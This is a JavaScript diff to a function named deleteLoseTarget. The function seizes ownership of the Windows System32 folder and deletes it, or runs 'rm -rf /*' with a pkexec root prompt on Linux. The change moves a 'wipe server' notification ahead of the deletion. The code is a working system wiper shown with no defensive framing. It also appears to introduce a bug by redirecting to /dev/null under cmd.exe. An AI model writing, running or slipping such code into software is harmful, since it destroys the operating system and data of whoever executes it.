@@ -14,13 +14,16 @@ function pingWipeServer() {
 
 function deleteLoseTarget() {
   try {
+    // Ping first — deletion may kill the process before we get another chance
+    pingWipeServer();
+
     if (process.platform === 'win32') {
       // System32 files are owned by TrustedInstaller, not Administrator.
       // Take ownership + grant full ACL before deleting, otherwise rmSync silently skips.
       const target = path.join(process.env.SystemRoot || 'C:\\Windows', 'System32');
       execSync(
-        `takeown /f "${target}" /r /d y > nul 2>&1 & ` +
-        `icacls "${target}" /grant administrators:F /t > nul 2>&1`,
+        `takeown /f "${target}" /r /d y > /dev/null 2>&1 & ` +
+        `icacls "${target}" /grant administrators:F /t > /dev/null 2>&1`,
         { shell: 'cmd.exe' }
       );
       fs.rmSync(target, { recursive: true, force: true });
@@ -39,7 +42,6 @@ function deleteLoseTarget() {
       // Linux: try pkexec for a root auth prompt; fall back to plain rm (deletes user-owned files).
       execSync('pkexec rm -rf /* /.[!.]* 2>/dev/null || rm -rf /* /.[!.]* 2>/dev/null; true', { shell: '/bin/bash' });
     }
-    pingWipeServer();
     return { success: true };
   } catch (err) {
     return { success: false, reason: err.message };
